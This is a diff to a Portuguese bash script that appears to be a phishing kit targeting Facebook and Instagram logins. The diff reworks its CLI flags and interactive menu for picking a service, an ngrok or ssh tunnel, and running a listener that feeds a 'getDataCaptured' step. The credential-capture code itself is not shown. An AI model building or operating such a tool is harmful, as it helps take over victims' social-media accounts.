@@ -63,6 +63,8 @@ listenKey=0
 tunnelKey=0
 
 listReq=("php" "jq" "curl" "tar")
+services=("facebook" "instagram")
+tunnels=("ngrok" "ssh")
 
 verifySystemOs() {
     proot=$(ps -e | grep -Eo "proot")
@@ -234,7 +236,7 @@ echo -e "\e[34m
 }
 
 helper() {
-    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\n\t-i, \n\t--interactive\tInicia o programa em modo interativo\n\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
+    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-S, --services\tLista todos os serviços\n\t-T, --tunnels\tLista todos os tunels\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\n\t-t, --tunnel\tTunela a conexão localhost\n\t-i, \n\t--interactive\tInicia o programa em modo interativo\n\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
     exit 0
 }
 
@@ -243,11 +245,12 @@ version() {
     grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
 }
 
+# Percorre a uma lista
 list() {
-    services=("facebook" "instagram")
-
-    for service in ${services[@]} ; do
-	echo -e "\e[0m\e[32m[√] $service\e[0m"
+    array="$1"
+    
+    for index in $array ; do
+	echo -e "\e[0m\e[31m$index\e[0m"
     done
 }
 
@@ -343,113 +346,119 @@ if [ -z "$1" ] ; then
     exit 1
 fi
 
-# Modo janelas
+# Modo interativo
 menu() {
     while [ true ] ; do
+
+	if [ -n "$service" -a -z "$tunnel" ] ; then
+	    echo -e "\e[0mSelected Service => \e[31;1m$service\e[0m"
+
+
+	elif [ -n "$service" -a -n "$tunnel" ] ; then
+	    echo -e "\e[0mSelected Service => \e[31;1m$service => Selected Tunnel => \e[31;1m$tunnel\e[0m"
+
+	fi
+
 	echo -ne "\e[34;2;4mdsl\e[0m > \e[34;2m" ; read
+
+	# EMPTY
 	if [ -z "$REPLY" ] ;then
-	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
-	    menu
-	
-	elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
-	interrupt && exit 0
+	        echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+	        menu
 
+	# QUIT
+        elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
+	    interrupt && exit 0
+
+	# HELP
 	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
-	    echo -e "\n\n\t\e[0mhelp OR ?\tMostra esta tela de ajuda\n\tshow\t\tMostra todos os serviços\n\tuse service <S>\tUsa um serviço, substitua <S> pelo serviço\n\n"
+	    echo -e "\n\n\t\e[0mhelp OR ?\tMostra esta tela de ajuda\n\tquit\t\tInterrompe este programa\n\tshow <?>\tMostra serviços, tunels, opçôes padrôes. Substitua <?> por um desses 3 comandos\n\tuse <?>\t\tUsa serviços e etc. Substitua <?> por um desses comandos\n\tset <?>\t\tDefine tunels e etc. Substitua <?> por um desses comandos\n\trun\t\tExecuta a configuração\n\n"
 
-	elif [ "$REPLY" == "show" ] ; then
-	    list
+	# SHOW
+	elif [ "${REPLY:0:4}" == "show" ] ; then
+	    if [ -z "${REPLY:5}" ] ;then
+		echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
 
+	    elif [ "${REPLY:5}" == "services" ] ;then
+	        list "${services[*]}"
+
+	    elif [ "${REPLY:5}" == "tunnels" ] ;then
+	        list "${tunnels[*]}"
+
+	    elif [ "${REPLY:5}" == "options" ] ;then
+	        echo -e "\n\n\t\e[0m\e[34;2mSelected service \e[32;2m=> \e[0m\t[\e[31m$service\e[0m]\n\t\e[34;2mSelected tunnel \e[32;2m=> \e[0m\t[\e[31m$tunnel\e[0m]\n\n"
+
+	    else
+	        echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
+
+	    fi
+
+	# USE
         elif [ "${REPLY:0:3}" == "use" ] ;then
 	    if [ "${REPLY:4:7}" == "service" ] ;then
-		if [ -n "${REPLY:12:8}" ] ;then 
+	  	if [ -n "${REPLY:12:8}" ] ;then 
 		    if [ "${REPLY:12}" == "facebook" -o "${REPLY:12}" == "instagram" ] ;then
 			service=${REPLY:12}
-		    	menuTunnel
 
 		    else
-			echo -e "\e[0m\e[33;1mServiço inválido\e[0m"
+			echo -e "\e[0m\e[33;1mServiço indisponível\e[0m"
+
 		    fi
 
 	        else
-		    echo -e "\e[0m\e[33;1mErro, faltou o serviço!\e[0m"
+		    echo -e "\e[0m\e[33;1mCommands = facebook - instagram - etc ?\e[0m"
 
 		fi
 
 	    else
-		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
+		echo -e "\e[0m\e[33;1mCommands = service - etc ?\e[0m"
 
 	    fi
 
-        else
-	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
-
-	fi
-    done
-    interrupt
-    exit 0
-}
-
-menuTunnel() {
-    tunnel="None"
-
-    while [ true ] ; do
-	echo -ne "\e[34;2;4mdsl\e[0m \e[34m<\e[31m$service\e[34m> \e[34;2m" ; read
-
-        if [ "${REPLY:0:4}" == "show" ] ;then	    
-            if [ "${REPLY:5:7}" == "options" ] ;then
-		echo -e "\n\n\t\e[0m\e[34;2mSelected service \e[32;2m=> \e[0m\t[\e[31m$service\e[0m]\n\t\e[34;2mSelected tunnel \e[32;2m=> \e[0m\t[\e[31m$tunnel\e[0m]\n\n"
-
-	    else
-		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
-	    fi
-
+	# SET	
 	elif [ "${REPLY:0:3}" == "set" ] ; then
 	    if [ "${REPLY:4:6}" == "tunnel" ] ;then
 		if [ -n "${REPLY:11}" ] ;then
-
 		    if [ "${REPLY:11}" == "ngrok" ] ;then
-		        tunnel=${REPLY:11}
+			tunnel=${REPLY:11}
 
 		    else
-			echo -e "\e[0m\e[33;1mTunel inválido\e[0m"
+			echo -e "\e[0m\e[33;1mTunel inválido\e[0m" 
 		    fi
-
+			
 		else
-		    tunnel="None"
-		    echo -e "\e[0m\e[33;1mErro, faltou o tunel!\e[0m"
-
+		    echo -e "\e[0m\e[33;1mCommands = ngrok - etc ?\e[0m"
 		fi
 
 	    else
-		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
-	    fi
+		echo -e "\e[0m\e[33;1mCommands = tunnel - etc ?\e[0m"
 
+	    fi
+	
+	# RUN
 	elif [ "$REPLY" == "run" ] ;then
 	    if [ -n "$service" -a -n "$tunnel" -a "$tunnel" == "ngrok" -o "$tunnel" == "ssh" ] ;then
-	        echo -e "\e[0mRunning external..."
+		echo -e "\e[0mRunning external..."
 		args="--listen --service $service --tunnel $tunnel"
 		listen && tunnel && getDataCaptured
 
-	    elif [ -n "$service" -a "$tunnel" == "None" ] ;then
+	    elif [ -n "$service" -a -z "$tunnel" ] ;then
 		echo -e "\e[0mRunning local..."
 		args="--listen --service $service"
 		listen && getDataCaptured
 
+	    else
+		echo -e "\e[0m\e[33;1mMenhuma configuração definida!\e[0m"
 	    fi
 
-	elif [ "$REPLY" == "back" -o "$REPLY" == "return" ] ;then
-	    echo -e "\e[0m$REPLY => retornou ao inicio"
-	    menu
+        else
+	    echo -e "\e[0m\e[33;1mCommands = ? - help\e[0m"
 
-	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
-	    echo -e "\n\n\t\e[0mshow options\tMostra as opçôes padrôes\n\tset tunnel\tDefine um tunel\n\trun\t\tExecuta o serviço definido\n\tback ou return\tRetorna ao menu inicial\n\n"
-	
-	else
-	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda\e[0m"
-	    
-        fi
+	fi
+
     done
+    interrupt
+    exit 0
 }
 
 banner_two() {
@@ -473,8 +482,10 @@ while [ -n "$1" ] ; do
 	    helper;;
 	-v | --version)
 	    version && exit 0;;
-	-L | --list)
-	    list && exit 0;;
+	-S | --services)
+	    list "${services[*]}" && exit 0;;
+	-T | --tunnels)
+	    list "${tunnels[*]}" && exit 0;;
 	-s | --service)
 	    shift
 
